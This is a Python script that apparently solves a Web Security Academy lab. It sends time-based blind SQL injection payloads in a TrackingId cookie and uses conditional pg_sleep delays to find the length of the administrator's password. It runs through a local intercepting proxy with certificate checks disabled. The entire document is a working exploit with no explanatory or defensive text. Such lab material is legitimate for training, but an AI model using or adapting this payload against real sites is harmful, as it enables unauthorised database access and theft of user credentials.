#!/usr/bin/python3
#_*_ coding: utf-8 _*_

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

for l in range(1,25):
    try:
        
        url = "https://acda1f461edf6e8ac0737b1300ff0092.web-security-academy.net"
        proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
        headers = {"Host": "acda1f461edf6e8ac0737b1300ff0092.web-security-academy.net",
"Cookie": "TrackingId=JBJXvGIplT4nR89w'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>"+str(l)+")+THEN+pg_sleep(9)+ELSE+pg_sleep(0)+END+FROM+users--; session=uVH6yFt0c51UZM0c7pTjLDUAExIXJDRJ"}
        r = requests.get(url=url,headers=headers,proxies=proxies,verify=False)
        timedelay = str(r.elapsed.total_seconds())[0]

        if int(timedelay) >= 9:
            print("[+] Password length:",l+1,end="\r")
    
    except:
        print("An exception occurred")
        exit()